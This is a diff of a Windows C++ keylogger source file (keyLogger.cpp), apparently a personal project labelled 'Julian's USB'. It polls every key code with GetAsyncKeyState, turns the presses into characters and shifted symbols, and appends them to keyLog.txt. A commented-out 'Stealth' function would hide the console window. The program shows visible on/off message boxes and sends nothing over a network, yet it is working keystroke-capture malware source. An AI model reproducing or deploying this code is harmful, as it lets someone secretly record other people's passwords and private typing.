@@ -1,131 +1,39 @@
 // keyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include <Windows.h>
-#include <WinUser.h>
 #include <iostream>
 #include <fstream>
 #include <sstream>
 #include <cctype>
 #include <iomanip>
-//void Stealth();
-//void saveToFile(int keyStroke, string &previousKey, ofstream &outfile);
+#include <string>
 using namespace std;
-
+//void Stealth();
+string translateKey(int keyStroke);
+void logKey(string keyStroke);
 int main()
 { 
-    ostringstream strm;
-    while(true)
+    enum Status{disable, enable};
+    Status log = enable;
+    MessageBox(NULL, "Key Logging Status: ON", "Julian's USB", MB_OK | MB_ICONASTERISK);
+    while(log == enable)
     {
         for (int i = 0; i < 256; i++)
         {
+            bool LShiftDown = GetAsyncKeyState(VK_LSHIFT);
+            bool LControlDown = GetAsyncKeyState(VK_LCONTROL);
+            if (LShiftDown && LControlDown)
+            { 
+                log = disable;
+            }
             if (GetAsyncKeyState(i) & 0b1)
             {
-                cout << i << "->";
-                bool shiftIsDown = GetAsyncKeyState(VK_LSHIFT);
-                if (char(i) >= 'A' && char(i) <= 'Z') 
-                {
-                    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || shiftIsDown)
-                    {
-                        cout << char(i) << endl;
-                    }
-                    else 
-                    {
-                        cout << char(tolower(char(i))) << endl;
-                    }
-                }
-                else if ((i > 47 && i < 58))
-                {
-                    if (!shiftIsDown)
-                    {
-                        ostringstream strm;
-                        strm << hex << int(i);
-                        cout << char(i);
-                    }
-                    else
-                    {
-                        switch (char(i))
-                        {
-                        case '0':
-                            cout << ")";
-                            break;
-                        case '1':
-                            cout << "!";
-                            break;
-                        case '2':
-                            cout << "@";
-                            break;
-                        case '3':
-                            cout << "#";
-                            break;
-                        case '4':
-                            cout << "$";
-                            break;
-                        case '5':
-                            cout << "%";
-                            break;
-                        case '6':
-                            cout << "^";
-                            break;
-                        case '7':
-                            cout << "&";
-                            break;
-                        case '8':
-                            cout << "*";
-                            break;
-                        case '9':
-                            cout << "(";
-                            break;
-                        }
-                    }
-                }
-                else
-                {
-                    switch (i) {
-                    case VK_DELETE:
-                        cout << "[Delete]";
-                        break;
-                    case VK_BACK:
-                        cout << "[Backspace]";
-                        break;
-                    case VK_NUMPAD0:
-                        cout << "0";
-                        break;
-                    case VK_NUMPAD1:
-                        cout << "1";
-                        break;
-                    case VK_NUMPAD2:
-                        cout << "2";
-                        break;
-                    case VK_NUMPAD3:
-                        cout << "3";
-                        break;
-                    case VK_NUMPAD4:
-                        cout << "4";
-                        break;
-                    case VK_NUMPAD5:
-                        cout << "5";
-                        break;
-                    case VK_NUMPAD6:
-                        cout << "6";
-                        break;
-                    case VK_NUMPAD7:
-                        cout << "7";
-                        break;
-                    case VK_NUMPAD8:
-                        cout << "8";
-                        break;
-                    case VK_NUMPAD9:
-                        cout << "9";
-                        break;
-                    case VK_SPACE:
-                        cout << "[Space]";
-                        break;
-                    }
-                }
+                logKey(translateKey(i));
             }
-
         }
     }
+    MessageBox(NULL, "Key Logging Status: OFF", "Julian's USB", MB_OK | MB_ICONASTERISK);
+    return 0;
 }
 
 /*void Stealth()
@@ -136,74 +44,69 @@ int main()
     Stealth = FindWindowA("ConsleWindowClass", NULL);
     ShowWindow(Stealth, hide);
 }*/
-void saveToFile(int keyStroke, string& previousKey, ofstream& outfile)
+void logKey(string keyStroke)
 {
+    ofstream outfile;
     outfile.open("keyLog.txt", ios_base::out | ios_base::app);
+    outfile << keyStroke;
+    outfile.close();
+}
+string translateKey(int keyStroke)
+{
+    string key;
+    bool shiftIsDown = GetAsyncKeyState(VK_LSHIFT);
     if (char(keyStroke) >= 'A' && char(keyStroke) <= 'Z')
     {
-        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || previousKey == "[Shift]")//If capslock is on OR if SHIFT is being held down 
+        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || shiftIsDown)
         {
-            outfile << char(keyStroke);
-            previousKey = char(keyStroke);
+            key = char(keyStroke);
         }
         else
         {
-            outfile << char(tolower(char(keyStroke)));
-            previousKey = char(keyStroke);
+            key = char(tolower(char(keyStroke)));
         }
     }
-    else if (keyStroke > 47 && keyStroke < 58)//if it is between 1 and 9 in decimal
+    else if ((keyStroke > 47 && keyStroke < 58))
     {
-        ostringstream strm;
-        strm << hex << int(keyStroke);
-        if (previousKey != "[Shift]")
+        if (!shiftIsDown)
         {
-            outfile << char(keyStroke);
-            previousKey = char(keyStroke);
+            ostringstream strm;
+            strm << hex << int(keyStroke);
+           key = char(keyStroke);
         }
         else
         {
-            switch (char(keyStroke)) 
+            switch (char(keyStroke))
             {
             case '0':
-                outfile << ")";
-                previousKey = ")";
+               key = ")";
                 break;
             case '1':
-                outfile << "!";
-                previousKey = "!";
+               key = "!";
                 break;
             case '2':
-                outfile << "@";
-                previousKey = "@";
+               key = "@";
                 break;
             case '3':
-                outfile << "#";
-                previousKey = "#";
+               key = "#";
                 break;
             case '4':
-                outfile << "$";
-                previousKey = "$";
+               key = "$";
                 break;
             case '5':
-                outfile << "%";
-                previousKey = "%";
+               key = "%";
                 break;
             case '6':
-                outfile << "^";
-                previousKey = "^";
+               key = "^";
                 break;
             case '7':
-                outfile << "&";
-                previousKey = "&";
+               key = "&";
                 break;
             case '8':
-                outfile << "*";
-                previousKey = "*";
+               key = "*";
                 break;
             case '9':
-                outfile << "(";
-                previousKey = "(";
+               key = "(";
                 break;
             }
         }
@@ -212,64 +115,170 @@ void saveToFile(int keyStroke, string& previousKey, ofstream& outfile)
     {
         switch (keyStroke) {
         case VK_DELETE:
-            outfile << "[Delete]";
-            previousKey = "[Delete]";
+           key = "[Delete]";
             break;
         case VK_BACK:
-            outfile << "[Backspace]";
-            previousKey = "[Backspace]";
+           key = "[Backspace]";
             break;
         case VK_NUMPAD0:
-            outfile << "0";
-            previousKey = "0";
+           key = "0";
             break;
         case VK_NUMPAD1:
-            outfile << "1";
-            previousKey = "1";
+           key = "1";
             break;
         case VK_NUMPAD2:
-            outfile << "2";
-            previousKey = "2";
+           key = "2";
             break;
         case VK_NUMPAD3:
-            outfile << "3";
-            previousKey = "3";
+           key = "3";
             break;
         case VK_NUMPAD4:
-            outfile << "4";
-            previousKey = "4";
+           key = "4";
             break;
         case VK_NUMPAD5:
-            outfile << "5";
-            previousKey = "5";
+           key = "5";
             break;
         case VK_NUMPAD6:
-            outfile << "6";
-            previousKey = "6";
+           key = "6";
             break;
         case VK_NUMPAD7:
-            outfile << "7";
-            previousKey = "7";
+           key = "7";
             break;
         case VK_NUMPAD8:
-            outfile << "8";
-            previousKey = "8";
+           key = "8";
             break;
         case VK_NUMPAD9:
-            outfile << "9";
-            previousKey = "9";
-            break;
-        case VK_LSHIFT:
-            if(previousKey!= "[Shift]") previousKey = "[Shift]";
-            break;
-        case VK_RSHIFT:
-            if (previousKey != "[Shift]") previousKey = "[Shift]";
+           key = "9";
             break;
         case VK_SPACE:
-            outfile << "[Space]";
-            previousKey = "[Space]";
+           key = "[Space]";
+            break;
+        case VK_SUBTRACT:
+           key = "-";
+            break;
+        case VK_DECIMAL:
+           key = ".";
+            break;
+        case VK_DIVIDE:
+           key = "/";
+            break;
+        case VK_ADD:
+           key = "+";
+            break;
+        case VK_MULTIPLY:
+           key = "*";
+            break;
+        case VK_OEM_PLUS:
+            if (!shiftIsDown)
+            {
+               key = "=";
+            }
+            else
+            {
+               key = "+";
+            }
+            break;
+        case VK_OEM_MINUS:
+            if (!shiftIsDown)
+            {
+               key = "-";
+            }
+            else
+            {
+               key = "_";
+            }
+            break;
+        case VK_OEM_COMMA:
+            if (!shiftIsDown)
+            {
+               key = ",";
+            }
+            else
+            {
+               key = "<";
+            }
+            break;
+        case VK_OEM_PERIOD:
+            if (!shiftIsDown)
+            {
+               key = ".";
+            }
+            else
+            {
+               key = ">";
+            }
+            break;
+        case VK_OEM_1:
+            if (!shiftIsDown)
+            {
+               key = ";";
+            }
+            else
+            {
+               key = ":";
+            }
+            break;
+        case VK_OEM_2:
+            if (!shiftIsDown)
+            {
+               key = "/";
+            }
+            else
+            {
+               key = "?";
+            }
+            break;
+        case VK_OEM_3:
+            if (!shiftIsDown)
+            {
+               key = "`";
+            }
+            else
+            {
+               key = "~";
+            }
+            break;
+        case VK_OEM_4:
+            if (!shiftIsDown)
+            {
+               key = "[";
+            }
+            else
+            {
+               key = "{";
+            }
+            break;
+        case VK_OEM_5:
+            if (!shiftIsDown)
+            {
+               key = "\\";
+            }
+            else
+            {
+               key = "|";
+            }
+            break;
+        case VK_OEM_6:
+            if (!shiftIsDown)
+            {
+               key = "]";
+            }
+            else
+            {
+               key = "}";
+            }
+            break;
+        case VK_OEM_7:
+            if (!shiftIsDown)
+            {
+               key = "'";
+            }
+            else
+            {
+               key = "\"";
+            }
             break;
         }
     }
-    outfile.close();
+    return key;
 }
